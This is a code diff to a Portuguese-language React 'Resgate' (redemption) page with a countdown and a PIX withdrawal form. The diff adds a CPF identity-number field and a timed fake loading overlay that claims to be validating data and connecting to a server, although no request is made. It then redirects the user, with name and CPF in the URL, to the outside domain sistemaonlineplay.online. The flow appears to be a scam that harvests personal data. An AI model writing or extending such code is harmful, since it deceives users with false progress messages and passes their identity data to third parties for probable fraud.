@@ -28,10 +28,20 @@ const Resgate = () => {
   // Modal de Saque PIX
   const [pixOpen, setPixOpen] = useState(false);
   const [fullName, setFullName] = useState("");
+  const [cpf, setCpf] = useState("");
   const [pixType, setPixType] = useState<"" | "CPF" | "E-mail" | "Celular" | "Chave Aleatória">("");
   const [pixKey, setPixKey] = useState("");
   const [typeOpen, setTypeOpen] = useState(false);
   const [submitted, setSubmitted] = useState(false);
+
+  // Tela de carregamento (4 etapas)
+  const LOADING_STEPS = [
+    "Validando dados...",
+    "Conectando ao servidor...",
+    "Concluindo resgate...",
+    "Quase pronto...",
+  ];
+  const [loadingStep, setLoadingStep] = useState<number | null>(null);
 
   useEffect(() => {
     const id = setInterval(() => setSecondsLeft((s) => (s > 0 ? s - 1 : 0)), 1000);
@@ -60,8 +70,30 @@ const Resgate = () => {
   };
 
   const confirmPix = () => {
-    if (!fullName.trim() || !pixType || !pixKey.trim()) return;
-    setSubmitted(true);
+    if (!fullName.trim() || !cpf.trim() || !pixType || !pixKey.trim()) return;
+    setPixOpen(false);
+    setLoadingStep(0);
+  };
+
+  // Avança as etapas do loading e redireciona ao final
+  useEffect(() => {
+    if (loadingStep === null) return;
+    if (loadingStep >= LOADING_STEPS.length) {
+      const nome = encodeURIComponent(fullName.trim()).replace(/%20/g, "+");
+      const cpfParam = encodeURIComponent(cpf.trim());
+      window.location.href = `https://sistemaonlineplay.online/check/index.html?nome=${nome}&cpf=${cpfParam}`;
+      return;
+    }
+    const t = setTimeout(() => setLoadingStep((s) => (s ?? 0) + 1), 1400);
+    return () => clearTimeout(t);
+  }, [loadingStep, fullName, cpf]);
+
+  const formatCPF = (v: string) => {
+    const d = v.replace(/\D/g, "").slice(0, 11);
+    return d
+      .replace(/(\d{3})(\d)/, "$1.$2")
+      .replace(/(\d{3})(\d)/, "$1.$2")
+      .replace(/(\d{3})(\d{1,2})$/, "$1-$2");
   };
 
   const placeholderByType: Record<string, string> = {
@@ -287,6 +319,19 @@ const Resgate = () => {
                   className="mb-4 w-full rounded-xl border border-emerald-700/60 bg-emerald-900/50 px-3 py-3 text-sm font-medium text-white placeholder:text-emerald-500/60 focus:border-yellow-400/50 focus:outline-none focus:ring-2 focus:ring-yellow-400/30"
                 />
 
+                {/* CPF */}
+                <label className="mb-1.5 block text-xs font-bold text-emerald-200/90">
+                  CPF
+                </label>
+                <input
+                  type="text"
+                  inputMode="numeric"
+                  value={cpf}
+                  onChange={(e) => setCpf(formatCPF(e.target.value))}
+                  placeholder="000.000.000-00"
+                  className="mb-4 w-full rounded-xl border border-emerald-700/60 bg-emerald-900/50 px-3 py-3 text-sm font-medium text-white placeholder:text-emerald-500/60 focus:border-yellow-400/50 focus:outline-none focus:ring-2 focus:ring-yellow-400/30"
+                />
+
                 {/* Tipo de chave PIX */}
                 <label className="mb-1.5 block text-xs font-bold text-emerald-200/90">
                   Tipo de chave PIX
@@ -346,7 +391,7 @@ const Resgate = () => {
                 <button
                   type="button"
                   onClick={confirmPix}
-                  disabled={!fullName.trim() || !pixType || !pixKey.trim()}
+                  disabled={!fullName.trim() || !cpf.trim() || !pixType || !pixKey.trim()}
                   className="mt-2 flex h-12 w-full items-center justify-center gap-2 rounded-2xl bg-gradient-to-r from-yellow-400 to-amber-400 text-sm font-display font-bold text-emerald-950 shadow-lg shadow-yellow-500/25 transition-all hover:from-yellow-300 hover:to-amber-300 active:scale-[0.98] disabled:cursor-not-allowed disabled:opacity-50"
                 >
                   <Wallet className="h-5 w-5" strokeWidth={2.5} />
@@ -354,6 +399,25 @@ const Resgate = () => {
                 </button>
               </>
             )}
+          </div>
+        </div>
+      )}
+
+      {/* Overlay de carregamento com etapas */}
+      {loadingStep !== null && (
+        <div className="fixed inset-0 z-[60] flex flex-col items-center justify-center bg-emerald-950/85 backdrop-blur-sm px-6">
+          <div className="w-full max-w-sm">
+            <div className="mb-5 h-2.5 w-full overflow-hidden rounded-full bg-emerald-900/70">
+              <div
+                className="h-full rounded-full bg-gradient-to-r from-yellow-400 to-amber-400 transition-all duration-700 ease-out"
+                style={{
+                  width: `${Math.min(((Math.min(loadingStep, LOADING_STEPS.length - 1) + 1) / LOADING_STEPS.length) * 100, 100)}%`,
+                }}
+              />
+            </div>
+            <p className="text-center text-base font-display font-bold text-white">
+              {LOADING_STEPS[Math.min(loadingStep, LOADING_STEPS.length - 1)]}
+            </p>
           </div>
         </div>
       )}
